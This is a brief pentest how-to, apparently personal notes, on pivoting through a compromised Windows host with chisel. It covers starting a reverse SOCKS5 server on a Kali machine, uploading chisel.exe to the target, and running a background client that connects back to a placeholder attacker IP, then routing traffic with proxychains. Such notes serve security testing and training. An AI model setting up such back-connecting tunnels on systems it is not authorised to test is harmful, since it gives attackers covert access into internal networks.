download chisel on https://github.com/jpillora/chisel/releases 

download **[chisel_1.7.7_linux_amd64.gz](https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz) for kali and [chisel_1.7.7_windows_amd64.gz](https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz) for target windows.**

prepare chisel server on kali : 

```bash
chmod +x chisel
```

open server on kali : 

```bash
./chisel server -p <Local_Attacker_Port> --socks5 --reverse
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/75a68da9-5a6f-4ac9-9110-b9fca3510271/Untitled.png)

upload chisel.exe to windows target and run following command.

```bash
chisel.exe client <attacker_IP>:<Local_listening_port> R:socks &
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f4fa68b5-f62c-4f5a-a9f6-28601b830310/Untitled.png)

Remind : & on command is meaning run chisel on background

After run chisel client, check state connect on chisel server. it should be like this

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/eb2252b3-4735-45a4-ac46-52f2ae4e209d/Untitled.png)

try testing by use proxychains before command